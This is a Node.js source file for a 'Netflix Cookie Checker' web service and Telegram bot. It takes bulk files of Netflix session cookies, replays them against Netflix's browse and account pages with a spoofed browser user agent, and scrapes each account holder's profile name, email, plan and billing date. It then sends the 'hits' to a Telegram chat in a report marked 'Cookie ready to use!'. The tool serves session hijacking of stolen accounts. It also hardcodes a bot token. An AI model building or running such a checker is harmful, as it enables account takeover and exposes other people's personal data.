// index.js
const express = require('express');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const fileUpload = require('express-fileupload');

const app = express();
app.use(express.json());
app.use(express.text());
app.use(fileUpload());

// ==================== CONFIGURATION ====================
const CONFIG = {
    PORT: process.env.PORT || 3000,
    BOT_TOKEN: '8774867614:AAHpgmIpGCHhpMvit4KZputXoifNOatgRC8',
    CHAT_ID: process.env.CHAT_ID || 'YOUR_CHAT_ID_HERE', // User should set this in Render env vars
    AUTO_PING_URL: process.env.RENDER_EXTERNAL_URL || `http://localhost:${process.env.PORT || 3000}`,
    CHECK_DELAY_MS: 2000,
    USER_AGENT: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
};

// In-memory storage for results (no database)
let pendingBulkChecks = new Map();

// ==================== HELPER FUNCTIONS ====================
function parseNetscapeCookie(cookieContent) {
    const cookies = {};
    const lines = cookieContent.split('\n');
    
    for (const line of lines) {
        const trimmed = line.trim();
        if (!trimmed || trimmed.startsWith('#') || trimmed.startsWith('HttpOnly')) continue;
        
        const parts = trimmed.split('\t');
        if (parts.length >= 7) {
            // Netscape format: domain, flag, path, secure, expiration, name, value
            const name = parts[5];
            const value = parts[6];
            cookies[name] = value;
        } else if (trimmed.includes('=') && !trimmed.startsWith('#')) {
            const [name, value] = trimmed.split('=');
            cookies[name.trim()] = value.trim();
        }
    }
    return cookies;
}

async function checkNetflixCookies(cookiesDict) {
    const headers = {
        "User-Agent": CONFIG.USER_AGENT,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive"
    };
    
    // Create axios instance with cookie jar simulation
    let cookieString = '';
    for (const [name, value] of Object.entries(cookiesDict)) {
        cookieString += `${name}=${value}; `;
    }
    
    try {
        // First request to browse page
        const response = await axios.get('https://www.netflix.com/browse', {
            headers: {
                ...headers,
                'Cookie': cookieString
            },
            maxRedirects: 5,
            timeout: 15000
        });
        
        const pageContent = response.data;
        
        // Check if redirected to login (check response URL or content)
        if (response.request && response.request.res && response.request.res.responseUrl) {
            const responseUrl = response.request.res.responseUrl;
            if (responseUrl.includes('/login') || responseUrl.includes('/signup')) {
                return { valid: false, error: "Cookies expired - Redirected to login" };
            }
        }
        
        if (response.status !== 200) {
            return { valid: false, error: `HTTP ${response.status}` };
        }
        
        // Check if login page is shown in content
        if (pageContent.includes('signup') && pageContent.includes('login') && pageContent.includes('password')) {
            return { valid: false, error: "Cookies expired - Login page detected" };
        }
        
        // Extract profile information
        const profileMatch = pageContent.match(/"profileName":"([^"]+)"/);
        const emailMatch = pageContent.match(/"email":"([^"]+)"/);
        const accountMatch = pageContent.match(/"accountOwner":"([^"]+)"/);
        
        let profileInfo = {
            profile_name: profileMatch ? profileMatch[1] : "Unknown",
            email: emailMatch ? emailMatch[1] : "Unknown",
            account_owner: accountMatch ? accountMatch[1] : "Unknown",
            plan: "Unknown"
        };
        
        // Try to get subscription info from account page
        try {
            const accountResponse = await axios.get('https://www.netflix.com/YourAccount', {
                headers: {
                    ...headers,
                    'Cookie': cookieString
                },
                timeout: 10000
            });
            
            if (accountResponse.status === 200) {
                const accountText = accountResponse.data;
                
                const plans = ['Premium', 'Standard', 'Basic', 'Mobile'];
                for (const plan of plans) {
                    if (accountText.match(new RegExp(plan, 'i'))) {
                        profileInfo.plan = plan;
                        break;
                    }
                }
                
                const billingMatch = accountText.match(/Next billing date:.*?(\d{1,2}\/\d{1,2}\/\d{4})/i);
                if (billingMatch) profileInfo.next_billing = billingMatch[1];
            }
        } catch (e) {
            // Account page might fail, that's okay
        }
        
        return { valid: true, info: profileInfo };
        
    } catch (error) {
        if (error.response && error.response.status === 401) {
            return { valid: false, error: "Invalid cookies - Authentication failed" };
        }
        if (error.response && error.response.status === 403) {
            return { valid: false, error: "Forbidden - Cookies rejected" };
        }
        return { valid: false, error: error.message };
    }
}

async function sendTelegramMessage(message, chatId = null) {
    const targetChatId = chatId || CONFIG.CHAT_ID;
    if (!CONFIG.BOT_TOKEN || CONFIG.BOT_TOKEN === '8774867614:AAHpgmIpGCHhpMvit4KZputXoifNOatgRC8' && targetChatId === 'YOUR_CHAT_ID_HERE') {
        console.log('⚠️ Telegram bot not fully configured. Message:', message.substring(0, 200));
        console.log('💡 Set CHAT_ID environment variable to receive messages!');
        return false;
    }
    
    try {
        const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`;
        await axios.post(url, {
            chat_id: targetChatId,
            text: message,
            parse_mode: 'HTML'
        });
        return true;
    } catch (error) {
        console.error('Telegram send error:', error.message);
        return false;
    }
}

async function sendTelegramDocument(fileContent, fileName, chatId = null) {
    const targetChatId = chatId || CONFIG.CHAT_ID;
    if (!CONFIG.BOT_TOKEN || targetChatId === 'YOUR_CHAT_ID_HERE') return false;
    
    try {
        // Write temp file
        const tempPath = path.join('/tmp', fileName);
        fs.writeFileSync(tempPath, fileContent);
        
        const FormData = require('form-data');
        const form = new FormData();
        form.append('chat_id', targetChatId);
        form.append('document', fs.createReadStream(tempPath));
        
        await axios.post(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendDocument`, form, {
            headers: form.getHeaders()
        });
        
        fs.unlinkSync(tempPath);
        return true;
    } catch (error) {
        console.error('Telegram document send error:', error.message);
        return false;
    }
}

function formatResultMessage(fileName, result, index, total) {
    if (result.valid) {
        const info = result.info;
        return `✅ <b>VALID SESSION ${index}/${total}</b>\n` +
               `📄 File: ${fileName}\n` +
               `👤 Profile: ${info.profile_name}\n` +
               `📧 Email: ${info.email}\n` +
               `💳 Plan: ${info.plan || 'Unknown'}\n` +
               `${info.next_billing ? `📅 Next Billing: ${info.next_billing}\n` : ''}` +
               `🕐 Time: ${new Date().toLocaleString()}`;
    } else {
        return `❌ <b>INVALID SESSION ${index}/${total}</b>\n` +
               `📄 File: ${fileName}\n` +
               `⚠️ Error: ${result.error || 'Invalid cookies'}\n` +
               `🕐 Time: ${new Date().toLocaleString()}`;
    }
}

function generateFullReport(results, validCount, invalidCount, errorCount, total, chatId) {
    let content = '=' .repeat(60) + '\n';
    content += '🎬 NETFLIX COOKIE CHECKER - COMPLETE REPORT\n';
    content += `Generated: ${new Date().toLocaleString()}\n`;
    content += '=' .repeat(60) + '\n\n';
    
    content += `📊 SUMMARY\n`;
    content += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
    content += `Total files checked: ${total}\n`;
    content += `✅ Valid sessions: ${validCount}\n`;
    content += `❌ Invalid/Expired: ${invalidCount}\n`;
    content += `⚠️ Errors: ${errorCount}\n`;
    content += `📈 Success rate: ${total > 0 ? ((validCount/total)*100).toFixed(1) : 0}%\n\n`;
    
    content += '🎯 VALID SESSIONS DETAILS\n';
    content += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
    
    const validResults = results.filter(r => r.valid);
    if (validResults.length > 0) {
        for (const r of validResults) {
            content += `\n📄 File: ${r.fileName}\n`;
            content += `   👤 Profile: ${r.info.profile_name}\n`;
            content += `   📧 Email: ${r.info.email}\n`;
            content += `   💳 Plan: ${r.info.plan || 'Unknown'}\n`;
            if (r.info.next_billing) content += `   📅 Next Billing: ${r.info.next_billing}\n`;
            content += `   ✅ Status: VALID - WORKING\n`;
            content += `   🕐 Checked: ${new Date().toLocaleString()}\n`;
            content += `   🔑 Cookie ready to use!\n`;
            content += '-' .repeat(40) + '\n';
        }
    } else {
        content += '\n   ❌ No valid sessions found.\n';
    }
    
    content += '\n\n❌ INVALID/EXPIRED SESSIONS\n';
    content += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
    
    const invalidResults = results.filter(r => !r.valid && r.error && 
        (r.error.toLowerCase().includes('expired') || r.error.toLowerCase().includes('invalid') || r.error.toLowerCase().includes('login')));
    if (invalidResults.length > 0) {
        for (const r of invalidResults) {
            content += `\n📄 File: ${r.fileName}\n`;
            content += `   ❌ Error: ${r.error}\n`;
            content += '-' .repeat(40) + '\n';
        }
    }
    
    content += '\n\n⚠️ CONNECTION ERRORS\n';
    content += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
    
    const errorResults = results.filter(r => !r.valid && r.error && 
        !r.error.toLowerCase().includes('expired') && !r.error.toLowerCase().includes('invalid') && !r.error.toLowerCase().includes('login'));
    if (errorResults.length > 0) {
        for (const r of errorResults) {
            content += `\n📄 File: ${r.fileName}\n`;
            content += `   ⚠️ Error: ${r.error}\n`;
            content += '-' .repeat(40) + '\n';
        }
    }
    
    content += '\n' + '=' .repeat(60) + '\n';
    content += '🏁 End of Report - All cookies checked\n';
    content += '=' .repeat(60) + '\n';
    
    return content;
}

async function processBulkCheck(filesData, chatId) {
    const results = [];
    let validCount = 0;
    let invalidCount = 0;
    let errorCount = 0;
    const total = filesData.length;
    
    await sendTelegramMessage(`🔍 <b>Netflix Cookie Checker Started</b>\n📁 Total files: ${total}\n⏰ ${new Date().toLocaleString()}`, chatId);
    
    for (let i = 0; i < total; i++) {
        const { name, content } = filesData[i];
        
        // Parse cookies
        const cookies = parseNetscapeCookie(content);
        
        if (Object.keys(cookies).length === 0) {
            const result = { valid: false, error: "No cookies found in file" };
            results.push({ fileName: name, ...result });
            invalidCount++;
            
            const msg = formatResultMessage(name, result, i+1, total);
            await sendTelegramMessage(msg, chatId);
            continue;
        }
        
        // Check cookies
        const checkResult = await checkNetflixCookies(cookies);
        
        if (checkResult.valid) {
            validCount++;
            results.push({ fileName: name, valid: true, info: checkResult.info });
        } else if (checkResult.error && 
                  (checkResult.error.toLowerCase().includes('expired') || 
                   checkResult.error.toLowerCase().includes('invalid') ||
                   checkResult.error.toLowerCase().includes('login'))) {
            invalidCount++;
            results.push({ fileName: name, valid: false, error: checkResult.error });
        } else {
            errorCount++;
            results.push({ fileName: name, valid: false, error: checkResult.error });
        }
        
        const msg = formatResultMessage(name, checkResult, i+1, total);
        await sendTelegramMessage(msg, chatId);
        
        // Delay between checks
        if (i < total - 1) {
            await new Promise(resolve => setTimeout(resolve, CONFIG.CHECK_DELAY_MS));
        }
    }
    
    // Send summary
    const summary = `📊 <b>CHECK COMPLETE</b>\n` +
                    `━━━━━━━━━━━━━━━━━━\n` +
                    `📄 Total files: ${total}\n` +
                    `✅ Valid: ${validCount}\n` +
                    `❌ Invalid: ${invalidCount}\n` +
                    `⚠️ Errors: ${errorCount}\n` +
                    `📈 Success: ${total > 0 ? ((validCount/total)*100).toFixed(1) : 0}%\n` +
                    `━━━━━━━━━━━━━━━━━━\n` +
                    `🕐 ${new Date().toLocaleString()}`;
    
    await sendTelegramMessage(summary, chatId);
    
    // Generate and send full TXT report
    const reportContent = generateFullReport(results, validCount, invalidCount, errorCount, total, chatId);
    const fileName = `netflix_hits_${Date.now()}.txt`;
    await sendTelegramDocument(reportContent, fileName, chatId);
    
    return { results, validCount, invalidCount, errorCount };
}

// ==================== AUTO-PING FUNCTION ====================
function startAutoPing() {
    // Ping every 4 minutes to keep the service alive on Render free tier
    setInterval(async () => {
        try {
            const pingUrl = `${CONFIG.AUTO_PING_URL}/ping`;
            const response = await axios.get(pingUrl, { timeout: 5000 });
            console.log(`💓 Auto-ping sent at ${new Date().toLocaleTimeString()} - Status: ${response.status}`);
        } catch (error) {
            console.log(`⚠️ Auto-ping failed: ${error.message}`);
        }
    }, 4 * 60 * 1000); // 4 minutes
}

// ==================== EXPRESS ROUTES ====================
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Netflix Cookie Checker Bot</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; background: #141414; color: #fff; min-height: 100vh; }
                .container { max-width: 900px; margin: 0 auto; padding: 20px; }
                .header { text-align: center; padding: 30px 0; }
                .header h1 { color: #e50914; font-size: 2.5rem; margin-bottom: 10px; }
                .header p { color: #888; }
                .card { background: #2d2d2d; border-radius: 12px; padding: 25px; margin-bottom: 20px; }
                .status { background: #1a1a1a; border-radius: 8px; padding: 15px; margin-bottom: 20px; display: flex; gap: 20px; flex-wrap: wrap; }
                .status-item { flex: 1; min-width: 150px; }
                .status-label { font-size: 12px; color: #888; text-transform: uppercase; letter-spacing: 1px; }
                .status-value { font-size: 18px; font-weight: bold; margin-top: 5px; }
                .status-value.online { color: #4caf50; }
                .btn { background: #e50914; color: white; border: none; padding: 12px 24px; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: bold; transition: all 0.3s; }
                .btn:hover { background: #f6121d; transform: scale(1.02); }
                .btn-secondary { background: #333; }
                .btn-secondary:hover { background: #444; }
                input[type="file"], textarea { width: 100%; padding: 12px; margin: 15px 0; border-radius: 8px; border: 1px solid #444; background: #1a1a1a; color: #fff; font-family: monospace; }
                textarea { resize: vertical; font-family: monospace; }
                .result { margin-top: 20px; padding: 15px; border-radius: 8px; display: none; }
                .result.valid { background: #1a4d1a; border-left: 4px solid #4caf50; display: block; }
                .result.invalid { background: #4a1a1a; border-left: 4px solid #e50914; display: block; }
                .footer { text-align: center; padding: 30px 0; color: #555; font-size: 12px; }
                .telegram-btn { display: inline-flex; align-items: center; gap: 10px; background: #0088cc; color: white; padding: 10px 20px; border-radius: 8px; text-decoration: none; margin-top: 15px; }
                .telegram-btn:hover { background: #0099dd; }
                hr { border-color: #444; margin: 20px 0; }
                code { background: #1a1a1a; padding: 2px 6px; border-radius: 4px; font-family: monospace; }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>🎬 Netflix Cookie Checker</h1>
                    <p>Check your Netflix cookies instantly • Live results • Full reports</p>
                </div>
                
                <div class="card">
                    <div class="status">
                        <div class="status-item">
                            <div class="status-label">Bot Status</div>
                            <div class="status-value online">🟢 ONLINE</div>
                        </div>
                        <div class="status-item">
                            <div class="status-label">Auto-Ping</div>
                            <div class="status-value online">🔄 ACTIVE (4min)</div>
                        </div>
                        <div class="status-item">
                            <div class="status-label">Server Time</div>
                            <div class="status-value">${new Date().toLocaleString()}</div>
                        </div>
                    </div>
                    
                    <h3>📤 Upload Cookie File</h3>
                    <p style="color:#888; font-size:14px; margin-bottom:10px;">Supported: .txt, .cookie, .netscape (Netscape format)</p>
                    <input type="file" id="cookieFile" accept=".txt,.cookie,.netscape">
                    <button class="btn" onclick="uploadFile()">🔍 Check Cookies</button>
                    
                    <hr>
                    
                    <h3>📝 Or Paste Cookie Content</h3>
                    <textarea id="cookieContent" rows="4" placeholder='# Netscape HTTP Cookie File&#10;.netflix.com	TRUE	/	FALSE	1700000000	secureNetflixId	YOUR_VALUE_HERE&#10;.netflix.com	TRUE	/	TRUE	1700000000	NetflixId	YOUR_VALUE_HERE'></textarea>
                    <button class="btn btn-secondary" onclick="checkPasted()">📋 Check Pasted Cookies</button>
                    
                    <div id="result" class="result"></div>
                </div>
                
                <div class="card">
                    <h3>🤖 Telegram Bot</h3>
                    <p>Send cookie files directly to the bot! The bot will check and reply instantly.</p>
                    <a href="https://t.me/NetflixCookieCheckerBot" class="telegram-btn" target="_blank">
                        📱 Open in Telegram
                    </a>
                    <p style="margin-top:15px; font-size:13px; color:#888;">
                        <strong>Bot Commands:</strong><br>
                        • Send any .txt, .cookie, or .netscape file → Automatic check<br>
                        • /start → Welcome message<br>
                        • Bulk check → Send multiple files one by one
                    </p>
                </div>
                
                <div class="card">
                    <h3>📖 Netscape Cookie Format Guide</h3>
                    <pre style="background:#1a1a1a; padding:15px; border-radius:8px; overflow-x:auto; font-size:12px;">
# Netscape HTTP Cookie File
.netflix.com	TRUE	/	FALSE	1700000000	secureNetflixId	YOUR_SECURE_ID
.netflix.com	TRUE	/	TRUE	1700000000	NetflixId	YOUR_NETFLIX_ID
.netflix.com	TRUE	/	TRUE	1700000000	SecureNetflixId	YOUR_SECURE_VALUE</pre>
                    <p style="color:#888; font-size:12px; margin-top:10px;">
                        ⚠️ <strong>Note:</strong> Essential cookies: secureNetflixId, NetflixId, SecureNetflixId<br>
                        🕐 Cookies typically expire within hours/days
                    </p>
                </div>
                
                <div class="footer">
                    Netflix Cookie Checker Bot • Deployed on Render • Auto-ping active to prevent sleep
                </div>
            </div>
            
            <script>
                async function uploadFile() {
                    const fileInput = document.getElementById('cookieFile');
                    const file = fileInput.files[0];
                    if (!file) { alert('Please select a file'); return; }
                    
                    const resultDiv = document.getElementById('result');
                    resultDiv.className = 'result';
                    resultDiv.innerHTML = '⏳ Checking cookies... Please wait...';
                    
                    const formData = new FormData();
                    formData.append('file', file);
                    
                    try {
                        const response = await fetch('/check-file', { method: 'POST', body: formData });
                        const result = await response.json();
                        
                        if (result.valid) {
                            resultDiv.className = 'result valid';
                            resultDiv.innerHTML = \`
                                <strong>✅ VALID SESSION</strong><br><br>
                                👤 Profile: \${result.info.profile_name}<br>
                                📧 Email: \${result.info.email}<br>
                                💳 Plan: \${result.info.plan || 'Unknown'}<br>
                                \${result.info.next_billing ? '📅 Next Billing: ' + result.info.next_billing + '<br>' : ''}
                                🕐 Time: \${new Date().toLocaleString()}
                            \`;
                        } else {
                            resultDiv.className = 'result invalid';
                            resultDiv.innerHTML = \`
                                <strong>❌ INVALID SESSION</strong><br><br>
                                ⚠️ Error: \${result.error || 'Invalid cookies'}<br>
                                🕐 Time: \${new Date().toLocaleString()}
                            \`;
                        }
                    } catch (err) {
                        resultDiv.className = 'result invalid';
                        resultDiv.innerHTML = \`❌ Error: \${err.message}\`;
                    }
                }
                
                async function checkPasted() {
                    const content = document.getElementById('cookieContent').value;
                    if (!content.trim()) { alert('Please paste cookie content'); return; }
                    
                    const resultDiv = document.getElementById('result');
                    resultDiv.className = 'result';
                    resultDiv.innerHTML = '⏳ Checking cookies... Please wait...';
                    
                    try {
                        const response = await fetch('/check-paste', {
                            method: 'POST',
                            headers: { 'Content-Type': 'text/plain' },
                            body: content
                        });
                        const result = await response.json();
                        
                        if (result.valid) {
                            resultDiv.className = 'result valid';
                            resultDiv.innerHTML = \`
                                <strong>✅ VALID SESSION</strong><br><br>
                                👤 Profile: \${result.info.profile_name}<br>
                                📧 Email: \${result.info.email}<br>
                                💳 Plan: \${result.info.plan || 'Unknown'}<br>
                                \${result.info.next_billing ? '📅 Next Billing: ' + result.info.next_billing + '<br>' : ''}
                                🕐 Time: \${new Date().toLocaleString()}
                            \`;
                        } else {
                            resultDiv.className = 'result invalid';
                            resultDiv.innerHTML = \`
                                <strong>❌ INVALID SESSION</strong><br><br>
                                ⚠️ Error: \${result.error || 'Invalid cookies'}<br>
                                🕐 Time: \${new Date().toLocaleString()}
                            \`;
                        }
                    } catch (err) {
                        resultDiv.className = 'result invalid';
                        resultDiv.innerHTML = \`❌ Error: \${err.message}\`;
                    }
                }
            </script>
        </body>
        </html>
    `);
});

app.get('/ping', (req, res) => {
    res.status(200).json({ status: 'alive', timestamp: new Date().toISOString() });
});

app.post('/check-file', async (req, res) => {
    if (!req.files || !req.files.file) {
        return res.status(400).json({ error: 'No file uploaded' });
    }
    
    const file = req.files.file;
    const content = file.data.toString('utf-8');
    const cookies = parseNetscapeCookie(content);
    
    if (Object.keys(cookies).length === 0) {
        return res.json({ valid: false, error: 'No valid cookies found in file' });
    }
    
    const result = await checkNetflixCookies(cookies);
    res.json(result);
});

app.post('/check-paste', async (req, res) => {
    const content = req.body;
    if (!content || typeof content !== 'string') {
        return res.status(400).json({ error: 'No content provided' });
    }
    
    const cookies = parseNetscapeCookie(content);
    if (Object.keys(cookies).length === 0) {
        return res.json({ valid: false, error: 'No valid cookies found in content' });
    }
    
    const result = await checkNetflixCookies(cookies);
    res.json(result);
});

// Telegram webhook endpoint
app.post(`/webhook/${CONFIG.BOT_TOKEN}`, async (req, res) => {
    try {
        const update = req.body;
        
        if (update.message && update.message.document) {
            const fileId = update.message.document.file_id;
            const chatId = update.message.chat.id;
            const fileName = update.message.document.file_name;
            
            await sendTelegramMessage(`📥 Received file: ${fileName}\n⏳ Checking cookies...`, chatId);
            
            // Download file from Telegram
            const fileUrl = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getFile?file_id=${fileId}`;
            const fileInfo = await axios.get(fileUrl);
            const filePath = fileInfo.data.result.file_path;
            const downloadUrl = `https://api.telegram.org/file/bot${CONFIG.BOT_TOKEN}/${filePath}`;
            
            const fileContent = await axios.get(downloadUrl, { responseType: 'text' });
            
            const cookies = parseNetscapeCookie(fileContent.data);
            let result;
            
            if (Object.keys(cookies).length === 0) {
                result = { valid: false, error: 'No valid cookies found in file' };
            } else {
                result = await checkNetflixCookies(cookies);
            }
            
            let reply;
            if (result.valid) {
                reply = `✅ <b>VALID SESSION!</b>\n\n` +
                        `👤 Profile: ${result.info.profile_name}\n` +
                        `📧 Email: ${result.info.email}\n` +
                        `💳 Plan: ${result.info.plan || 'Unknown'}\n` +
                        `${result.info.next_billing ? `📅 Next Billing: ${result.info.next_billing}\n` : ''}\n` +
                        `📁 File: ${fileName}`;
            } else {
                reply = `❌ <b>INVALID SESSION!</b>\n\n` +
                        `⚠️ Error: ${result.error || 'Invalid cookies'}\n` +
                        `📁 File: ${fileName}`;
            }
            
            await sendTelegramMessage(reply, chatId);
            
        } else if (update.message && update.message.text) {
            const text = update.message.text;
            const chatId = update.message.chat.id;
            
            if (text === '/start') {
                await sendTelegramMessage(
                    `🎬 <b>Welcome to Netflix Cookie Checker Bot!</b>\n\n` +
                    `Send me a <code>.txt</code>, <code>.cookie</code>, or <code>.netscape</code> file containing Netflix cookies in Netscape format, and I will check if they are valid.\n\n` +
                    `<b>Example cookie format:</b>\n` +
                    `<code>.netflix.com\tTRUE\t/\tFALSE\t1700000000\tsecureNetflixId\tYOUR_VALUE</code>\n\n` +
                    `🔑 <b>Essential cookies:</b> secureNetflixId, NetflixId, SecureNetflixId\n\n` +
                    `Made with ❤️ | Deployed on Render`,
                    chatId
                );
            } else if (text === '/help') {
                await sendTelegramMessage(
                    `📖 <b>Help Guide</b>\n\n` +
                    `• Send any cookie file → Automatic validation\n` +
                    `• Get instant result with profile details\n` +
                    `• Works with Netscape format cookies\n\n` +
                    `<b>How to export cookies:</b>\n` +
                    `1. Chrome: EditThisCookie extension → Export → Netscape\n` +
                    `2. Firefox: Cookie Quick Manager → Export\n\n` +
                    `⚠️ Cookies expire within hours/days`,
                    chatId
                );
            } else {
                await sendTelegramMessage(
                    `Send me a cookie file (.txt, .cookie, .netscape) to check!\n\nType /help for instructions.`,
                    chatId
                );
            }
        }
        
        res.sendStatus(200);
    } catch (error) {
        console.error('Webhook error:', error);
        res.sendStatus(200);
    }
});

// ==================== START SERVER ====================
const server = app.listen(CONFIG.PORT, () => {
    console.log(`
    ┌─────────────────────────────────────────────────────────────┐
    │                                                             │
    │   🎬 NETFLIX COOKIE CHECKER BOT - DEPLOYMENT READY          │
    │   ───────────────────────────────────────────────────────   │
    │                                                             │
    │   📡 Server:      http://localhost:${CONFIG.PORT}               │
    │   🔄 Auto-Ping:   Active (every 4 minutes)                  │
    │   🤖 Bot Token:   ${CONFIG.BOT_TOKEN.substring(0, 20)}...configured       │
    │   📨 Chat ID:     ${CONFIG.CHAT_ID === 'YOUR_CHAT_ID_HERE' ? '⚠️ SET THIS IN ENV!' : '✅ Configured'} │
    │                                                             │
    │   🌐 Web UI:      http://localhost:${CONFIG.PORT}               │
    │   🔗 Webhook:     /webhook/${CONFIG.BOT_TOKEN}              │
    │                                                             │
    └─────────────────────────────────────────────────────────────┘
    `);
    
    // Start auto-ping
    startAutoPing();
    
    // Set up Telegram webhook if external URL is available
    if (process.env.RENDER_EXTERNAL_URL) {
        const webhookUrl = `${process.env.RENDER_EXTERNAL_URL}/webhook/${CONFIG.BOT_TOKEN}`;
        axios.post(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/setWebhook`, {
            url: webhookUrl
        }).then(response => {
            console.log(`🔗 Telegram webhook: ${response.data.ok ? '✅ SET' : '❌ FAILED'}`);
            if (response.data.description) console.log(`   ${response.data.description}`);
        }).catch(err => {
            console.log(`⚠️ Webhook error: ${err.message}`);
        });
    } else {
        console.log('⚠️ RENDER_EXTERNAL_URL not set. Webhook not configured.');
        console.log('💡 Set RENDER_EXTERNAL_URL environment variable to enable Telegram bot.');
    }
});

// Graceful shutdown
process.on('SIGTERM', () => {
    console.log('🛑 Shutting down...');
    server.close(() => process.exit(0));
});